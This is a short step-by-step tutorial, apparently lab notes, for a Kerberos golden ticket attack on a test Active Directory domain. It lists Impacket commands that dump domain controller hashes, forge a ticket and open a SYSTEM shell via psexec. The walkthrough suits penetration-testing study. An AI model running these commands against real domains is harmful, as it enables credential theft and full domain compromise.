# Kerberos Golden Ticket Attack

## Dumping hashes from DC using Impacket secretsdump.py

`sudo python secretsdump.py marvel.local/administrator:Password123\!@hydra-dc.marvel.local`

## Create Golden Ticket using Impacket ticketer.py

`python ticketer.py -aesKey <AES_KEY> -domain-sid <Domain_SID_HERE> -domain <domain.name> <anyusernamehere>`

This will generate a <username>.ccache file in the current directory.  Move the <username>.ccache file to /tmp/<username.ccache>
  
Set the following variable within the bash terminal:

`export KRB5CCNAME='<username>.ccache'`

## Editing /etc/hosts File

Now you will need to add your domain details and IP address to your /etc/hosts file.  In my case my domain name is marvel.local and the Domain Controller is named hydra-dc.marvel.local and is at 10.0.2.15:

```
10.0.2.15   hydra-dc.marvel.local
10.0.2.15   marvel.local

```

## Impacket psexec.py

Once everything above has been set you will now be able to use Impackets psexec.py script to get a shell on the domain controller as NT AUTHORITY\SYSTEM:

`sudo python psexec.py -k -no-pass marvel.local/badman@hydra-dc.marvel.local`

Note that in the command above you MUST specify the fully qualified domain name for the domain controller `hydra-dc.marvel.local`.  If you only specify the IP address it will not work and show the error:

```
KerberosError: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
Also the ticket must be generated and used within the 20 minute time-frame as described in the article here "https://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html"
